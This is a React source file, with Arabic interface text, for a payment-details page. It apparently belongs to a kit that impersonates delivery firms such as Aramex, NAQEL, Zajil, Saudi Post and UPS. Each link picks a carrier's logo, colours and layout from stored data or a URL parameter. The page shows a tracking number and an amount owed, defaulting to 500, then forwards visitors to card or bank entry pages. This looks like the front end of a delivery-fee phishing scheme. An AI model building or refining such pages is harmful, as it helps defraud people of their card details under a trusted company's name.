import { useParams, useNavigate } from "react-router-dom";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getAnimalServiceBranding } from "@/lib/animalServiceLogos";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, PawPrint, MapPin } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const [logoError, setLogoError] = useState(false);

  const linkType = linkData?.type || 'shipping';
  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = linkType === 'animal' ? getAnimalServiceBranding(serviceKey) : getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;

  const getLayout = () => {
    const key = serviceKey.toLowerCase();
    switch (key) {
      case 'naqel':
        return NAQELLayout;
      case 'zajil':
        return ZajilLayout;
      case 'saudipost':
        return SaudiPostLayout;
      case 'ups':
        return UPSLayout;
      default:
        const CompanyLayout = getCompanyLayout(serviceKey);
        return CompanyLayout;
    }
  };

  const LayoutComponent = getLayout();

  // Get country code from link data
  const countryCode = shippingInfo?.selectedCountry || "SA";

  // Get currency info for display
  const currencyInfo = getCurrencyByCountry(countryCode);

  // Get amount from link data - handle both shipping and animal transport
  const rawAmount = shippingInfo?.cod_amount || shippingInfo?.transport_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Format amount with currency symbol and name
  const formattedAmount = formatCurrency(amount, countryCode);
  
  const handleProceed = () => {
    const paymentMethod = shippingInfo?.payment_method || 'card';
    
    if (paymentMethod === 'card') {
      navigate(`/pay/${id}/card-input`);
    } else {
      navigate(`/pay/${id}/bank-selector`);
    }
  };
  
  const paymentContent = (
    <>
      {/* Service Logo & Branding */}
      {branding.logo && !logoError ? (
        <div className="mb-6 sm:mb-8 flex items-center justify-center">
          <img 
            src={branding.logo} 
            alt={serviceName}
            className="h-14 sm:h-20 object-contain max-w-[200px] sm:max-w-[280px]"
            style={{ filter: 'drop-shadow(0 2px 8px rgba(0,0,0,0.1))' }}
            onError={() => setLogoError(true)}
          />
        </div>
      ) : (
        <div 
          className="mb-6 sm:mb-8 p-4 rounded-lg flex items-center justify-center"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
          }}
        >
          <h2 className="text-xl sm:text-2xl font-bold text-white">{serviceName}</h2>
        </div>
      )}

      {/* Shipping Info Display */}
      {shippingInfo && (
        <div 
          className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg border-2" 
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`,
            borderColor: `${branding.colors.primary}30`
          }}
        >
          <h3 
            className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
            style={{ color: branding.colors.primary }}
          >
            {linkType === 'animal' ? 'تفاصيل النقل' : 'تفاصيل الشحنة'}
          </h3>
          <div className="space-y-2 text-xs sm:text-sm">
            {linkType === 'animal' ? (
              <>
                {shippingInfo.animal_type && (
                  <div className="flex items-center gap-2">
                    <PawPrint className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
                    <span className="text-muted-foreground text-xs sm:text-sm">نوع الحيوان:</span>
                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.animal_type}</span>
                  </div>
                )}
                {shippingInfo.animal_details && (
                  <div className="flex items-start gap-2">
                    <Package className="w-3 h-3 sm:w-4 sm:h-4 mt-0.5" style={{ color: branding.colors.secondary }} />
                    <span className="text-muted-foreground text-xs sm:text-sm">التفاصيل:</span>
                    <span className="font-semibold text-xs sm:text-sm flex-1" style={{ color: branding.colors.text }}>{shippingInfo.animal_details}</span>
                  </div>
                )}
                {shippingInfo.destination && (
                  <div className="flex items-center gap-2">
                    <MapPin className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
                    <span className="text-muted-foreground text-xs sm:text-sm">الوجهة:</span>
                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.destination}</span>
                  </div>
                )}
              </>
            ) : (
              <>
                {shippingInfo.tracking_number && (
                  <div className="flex items-center gap-2">
                    <Hash className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
                    <span className="text-muted-foreground text-xs sm:text-sm">رقم الشحنة:</span>
                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.tracking_number}</span>
                  </div>
                )}
                {shippingInfo.package_description && (
                  <div className="flex items-center gap-2">
                    <Truck className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
                    <span className="text-muted-foreground text-xs sm:text-sm">وصف الطرد:</span>
                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.package_description}</span>
                  </div>
                )}
                {shippingInfo.cod_amount > 0 && (
                  <div className="flex items-center gap-2">
                    <DollarSign className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
                    <span className="text-muted-foreground text-xs sm:text-sm">مبلغ COD:</span>
                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      )}
      
      {/* Payment Summary */}
      <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
        <div className="flex justify-between py-2 sm:py-3 border-b text-sm sm:text-base" style={{ borderColor: `${branding.colors.primary}20` }}>
          <span className="text-muted-foreground">الخدمة</span>
          <span className="font-semibold" style={{ color: branding.colors.text }}>{serviceName}</span>
        </div>
        
        <div 
          className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
          }}
        >
          <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
          <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
            {formattedAmount}
          </span>
        </div>
      </div>
    
      {/* Payment Method */}
      <div className="mb-6 sm:mb-8">
        <h3 
          className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
          style={{ color: branding.colors.primary }}
        >
          طريقة الدفع
        </h3>
        <div 
          className="border-2 rounded-lg sm:rounded-xl p-4 sm:p-5 transition-all hover:shadow-lg"
          style={{
            borderColor: branding.colors.primary,
            background: `linear-gradient(135deg, ${branding.colors.primary}10, ${branding.colors.secondary}10)`
          }}
        >
          <div className="flex items-center gap-3 sm:gap-4">
            <div 
              className="w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center"
              style={{ background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})` }}
            >
              <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
            </div>
            <div>
              <p className="font-bold text-sm sm:text-base" style={{ color: branding.colors.text }}>الدفع بالبطاقة</p>
              <p className="text-xs sm:text-sm" style={{ color: branding.colors.textLight }}>
                Visa • Mastercard • Mada
              </p>
            </div>
          </div>
        </div>
      </div>
      
      {/* Proceed Button */}
      <Button
        onClick={handleProceed}
        size="lg"
        className="w-full text-base sm:text-lg py-6 sm:py-7 text-white font-bold hover:opacity-90 transition-all hover:scale-[1.02] shadow-lg"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
        }}
      >
        <span className="ml-2">الدفع بالبطاقة</span>
        <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 mr-2" />
      </Button>
    
      <p className="text-[10px] sm:text-xs text-center mt-4 sm:mt-5" style={{ color: branding.colors.textLight }}>
        🔒 بالمتابعة، أنت توافق على الشروط والأحكام
      </p>
    </>
  );

  return (
    <LayoutComponent
      companyKey={serviceKey}
      trackingNumber={shippingInfo?.tracking_number}
      amount={formattedAmount}
    >
      {paymentContent}
    </LayoutComponent>
  );
};

export default PaymentDetails;
